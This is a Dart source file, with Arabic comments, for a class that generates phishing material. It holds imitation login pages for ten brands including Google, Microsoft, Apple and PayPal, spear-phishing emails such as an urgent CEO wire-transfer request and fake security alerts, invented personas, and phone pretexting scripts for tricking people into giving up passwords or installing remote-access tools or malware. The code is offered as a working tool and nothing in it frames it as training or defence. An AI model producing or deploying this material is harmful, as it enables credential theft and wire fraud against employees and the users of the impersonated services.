import 'dart:math';

class AdvancedSocialEngineer {
  /// إنشاء صفحة تصيد متقدمة (ديناميكية)
  static String generateDynamicPhishingPage(String targetSite) {
    final templates = {
      'google': _googleTemplate(),
      'facebook': _facebookTemplate(),
      'instagram': _instagramTemplate(),
      'twitter': _twitterTemplate(),
      'linkedin': _linkedinTemplate(),
      'microsoft': _microsoftTemplate(),
      'apple': _appleTemplate(),
      'dropbox': _dropboxTemplate(),
      'netflix': _netflixTemplate(),
      'paypal': _paypalTemplate(),
    };

    return templates[targetSite.toLowerCase()] ?? _genericTemplate(targetSite);
  }

  /// توليد بريد تصيد متقدم
  static String generateSpearPhishingEmail({
    required String targetName,
    required String targetCompany,
    required String targetPosition,
    String? recentEvent,
    String? colleagueName,
  }) {
    final templates = [
      _urgentCeoEmail(targetName, targetCompany, colleagueName),
      _hrUpdateEmail(targetName, targetCompany),
      _securityAlertEmail(targetName, targetCompany),
      _invoiceEmail(targetName, targetCompany),
      _sharedDocumentEmail(targetName, colleagueName ?? 'John Smith'),
    ];

    return templates[Random().nextInt(templates.length)];
  }

  /// إنشاء ملف تعريف وهمي كامل
  static Map<String, dynamic> generateFakeProfile() {
    final firstNames = ['James', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica', 'Robert', 'Amanda'];
    final lastNames = ['Anderson', 'Martinez', 'Thompson', 'Williams', 'Brown', 'Davis', 'Wilson', 'Taylor'];
    final domains = ['gmail.com', 'outlook.com', 'protonmail.com', 'tutanota.com'];

    final firstName = firstNames[Random().nextInt(firstNames.length)];
    final lastName = lastNames[Random().nextInt(lastNames.length)];
    final company = _generateCompany();

    return {
      'name': '$firstName $lastName',
      'email': '${firstName.toLowerCase()}.${lastName.toLowerCase()}@${domains[Random().nextInt(domains.length)]}',
      'phone': '+1-555-${Random().nextInt(900) + 100}-${Random().nextInt(9000) + 1000}',
      'company': company,
      'position': _generatePosition(),
      'linkedin': 'linkedin.com/in/${firstName.toLowerCase()}-${lastName.toLowerCase()}-${Random().nextInt(999)}',
      'location': _generateLocation(),
    };
  }

  /// توليد سيناريو ت pretexting كامل
  static String generatePretext({
    required String target,
    required String goal,
  }) {
    final scenarios = [
      '''
PRETEXT: IT Support Call
CALLER: "Hello, this is [NAME] from IT Security. We've detected suspicious activity on your account."
GOAL: Get target to reveal password or install remote access tool.
SCRIPT:
1. Call target during lunch hours
2. Sound professional and slightly rushed
3. Mention a specific recent event (system update, security breach)
4. Ask them to "verify" their identity
5. Direct them to a phishing page or ask for credentials directly
''',
      '''
PRETEXT: Delivery Service
CALLER: "Hi, this is [NAME] from FedEx. We have a package for you but the address label is damaged."
GOAL: Get target's physical address or have them open a malicious attachment.
SCRIPT:
1. Sound friendly and helpful
2. Say package requires signature
3. Ask to confirm address details
4. Send follow-up email with "tracking number" (malicious link)
''',
      '''
PRETEXT: Job Recruiter
CALLER: "Hello, I'm a recruiter from [FAKE COMPANY]. Your profile impressed us."
GOAL: Get target's resume (with personal info) or have them download malware.
SCRIPT:
1. Research target on LinkedIn first
2. Mention real skills they have
3. Offer attractive salary/position
4. Send "job description" PDF (malicious)
5. Ask them to fill out "application form" (phishing)
''',
    ];

    return scenarios[Random().nextInt(scenarios.length)];
  }

  static String _googleTemplate() => '''<div style="text-align:center;margin-top:100px;font-family:sans-serif;"><img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"><h2>Sign in</h2><input type="email" placeholder="Email" style="width:300px;padding:10px;margin:5px;border:1px solid #ccc;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:300px;padding:10px;margin:5px;border:1px solid #ccc;border-radius:4px;"><br><button style="background:#1a73e8;color:white;padding:10px 30px;border:none;border-radius:4px;">Next</button></div>''';
  static String _facebookTemplate() => '''<div style="text-align:center;margin-top:50px;background:#f0f2f5;padding:20px;font-family:sans-serif;"><h1 style="color:#1877f2;">facebook</h1><div style="background:white;padding:20px;border-radius:8px;width:350px;margin:auto;"><input type="text" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:6px;"><br><input type="password" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:6px;"><br><button style="background:#1877f2;color:white;width:100%;padding:10px;border:none;border-radius:6px;">Log In</button></div></div>''';
  static String _instagramTemplate() => '''<div style="text-align:center;margin-top:30px;font-family:sans-serif;"><h1 style="font-family:cursive;">Instagram</h1><div style="border:1px solid #dbdbdb;width:350px;margin:auto;padding:20px;"><input type="text" placeholder="Username" style="width:100%;padding:8px;margin:3px 0;background:#fafafa;border:1px solid #dbdbdb;"><br><input type="password" placeholder="Password" style="width:100%;padding:8px;margin:3px 0;background:#fafafa;border:1px solid #dbdbdb;"><br><button style="background:#0095f6;color:white;width:100%;padding:7px;border:none;border-radius:4px;">Log In</button></div></div>''';
  static String _twitterTemplate() => '''<div style="text-align:center;margin-top:50px;font-family:sans-serif;"><h1 style="color:#1da1f2;">Twitter</h1><div style="width:350px;margin:auto;padding:20px;"><input type="text" placeholder="Phone, email, or username" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:100%;padding:10px;margin-top:10px;border:1px solid #ccc;border-radius:4px;"><br><button style="background:#1da1f2;color:white;width:100%;padding:10px;margin-top:10px;border:none;border-radius:20px;">Log In</button></div></div>''';
  static String _linkedinTemplate() => '''<div style="text-align:center;margin-top:30px;font-family:sans-serif;"><h1 style="color:#0a66c2;">LinkedIn</h1><div style="width:350px;margin:auto;padding:20px;"><input type="text" placeholder="Email" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:100%;padding:10px;margin-top:10px;border:1px solid #ccc;border-radius:4px;"><br><button style="background:#0a66c2;color:white;width:100%;padding:10px;margin-top:10px;border:none;border-radius:20px;">Sign In</button></div></div>''';
  static String _microsoftTemplate() => '''<div style="text-align:center;margin-top:50px;font-family:sans-serif;"><img src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b"><h2>Sign in</h2><input type="email" placeholder="Email, phone, or Skype" style="width:300px;padding:8px;border:1px solid #666;border-radius:2px;"><br><input type="password" placeholder="Password" style="width:300px;padding:8px;margin-top:10px;border:1px solid #666;border-radius:2px;"><br><button style="background:#0067b8;color:white;width:300px;padding:8px;margin-top:10px;border:none;">Sign in</button></div>''';
  static String _appleTemplate() => '''<div style="text-align:center;margin-top:50px;font-family:sans-serif;"><h1>Apple ID</h1><p>Sign in to continue</p><input type="text" placeholder="Apple ID" style="width:300px;padding:10px;border:1px solid #ccc;border-radius:6px;"><br><input type="password" placeholder="Password" style="width:300px;padding:10px;margin-top:10px;border:1px solid #ccc;border-radius:6px;"><br><button style="background:#0071e3;color:white;width:300px;padding:10px;margin-top:10px;border:none;border-radius:6px;">Sign In</button></div>''';
  static String _dropboxTemplate() => '''<div style="text-align:center;margin-top:50px;font-family:sans-serif;"><h1 style="color:#0061ff;">Dropbox</h1><h3>Sign in</h3><input type="email" placeholder="Email" style="width:300px;padding:10px;border:1px solid #ccc;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:300px;padding:10px;margin-top:10px;border:1px solid #ccc;border-radius:4px;"><br><button style="background:#0061ff;color:white;width:300px;padding:10px;margin-top:10px;border:none;border-radius:4px;">Sign in</button></div>''';
  static String _netflixTemplate() => '''<div style="text-align:center;margin-top:50px;background:#000;color:white;padding:40px;font-family:sans-serif;"><h1 style="color:#e50914;">NETFLIX</h1><h2>Sign In</h2><input type="email" placeholder="Email" style="width:300px;padding:12px;background:#333;border:1px solid #555;color:white;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:300px;padding:12px;margin-top:10px;background:#333;border:1px solid #555;color:white;border-radius:4px;"><br><button style="background:#e50914;color:white;width:300px;padding:12px;margin-top:10px;border:none;border-radius:4px;">Sign In</button></div>''';
  static String _paypalTemplate() => '''<div style="text-align:center;margin-top:50px;font-family:sans-serif;"><h1 style="color:#003087;">PayPal</h1><input type="email" placeholder="Email address" style="width:300px;padding:10px;border:1px solid #ccc;border-radius:4px;"><br><input type="password" placeholder="Password" style="width:300px;padding:10px;margin-top:10px;border:1px solid #ccc;border-radius:4px;"><br><button style="background:#0070ba;color:white;width:300px;padding:10px;margin-top:10px;border:none;border-radius:4px;">Log In</button></div>''';
  static String _genericTemplate(String site) => '''<div style="text-align:center;margin-top:100px;font-family:sans-serif;"><h1>$site</h1><h2>Sign In</h2><input type="text" placeholder="Username" style="width:300px;padding:10px;"><br><input type="password" placeholder="Password" style="width:300px;padding:10px;margin-top:10px;"><br><button style="background:blue;color:white;padding:10px 30px;margin-top:10px;">Log In</button></div>''';

  static String _urgentCeoEmail(String name, String company, String? colleague) => '''Subject: URGENT: Wire Transfer Needed Immediately
From: ${colleague ?? 'CEO'} <ceo@${company.toLowerCase().replaceAll(' ', '')}.com>
To: $name

$name,

I need you to process an urgent wire transfer for a client payment. The usual process can be bypassed for this one. I'll send the details shortly.

Please confirm receipt of this email immediately.

Thanks,
${colleague ?? 'CEO Office'}''';

  static String _hrUpdateEmail(String name, String company) => '''Subject: IMPORTANT: Update Your Employee Information
From: HR Department <hr@${company.toLowerCase().replaceAll(' ', '')}.com>
To: $name

Dear $name,

Our records indicate that your employee information is out of date. Please click the link below to update your details within 48 hours to avoid payroll disruption.

[UPDATE INFORMATION]

Best regards,
$company HR Department''';

  static String _securityAlertEmail(String name, String company) => '''Subject: Security Alert: Suspicious Login Attempt
From: Security Team <security@${company.toLowerCase().replaceAll(' ', '')}.com>
To: $name

Dear $name,

We detected a suspicious login attempt on your account from an unrecognized device in Russia. If this was not you, please secure your account immediately by clicking below:

[SECURE ACCOUNT]

This link expires in 24 hours.

$company Security''';

  static String _invoiceEmail(String name, String company) => '''Subject: Invoice #${Random().nextInt(99999) + 10000} - Payment Due
From: Billing <billing@${company.toLowerCase().replaceAll(' ', '')}.com>
To: $name

Dear $name,

Attached is your latest invoice for services rendered. Please remit payment by the due date to avoid late fees.

[VIEW INVOICE]

Thank you,
$company Billing''';

  static String _sharedDocumentEmail(String name, String colleague) => '''Subject: $colleague shared a document with you
From: $colleague <$colleague@shared-docs.com>
To: $name

$name,

I've shared an important document with you. Click below to view:

[OPEN DOCUMENT]

- $colleague''';

  static String _generateCompany() {
    final companies = ['TechCorp', 'DataSys', 'CloudNet', 'CyberSec', 'InnovateX', 'AlphaTech'];
    return companies[Random().nextInt(companies.length)];
  }

  static String _generatePosition() {
    final positions = ['Manager', 'Director', 'Engineer', 'Analyst', 'Coordinator', 'Specialist'];
    return positions[Random().nextInt(positions.length)];
  }

  static String _generateLocation() {
    final cities = ['New York, NY', 'San Francisco, CA', 'Chicago, IL', 'Austin, TX', 'Seattle, WA'];
    return cities[Random().nextInt(cities.length)];
  }
}
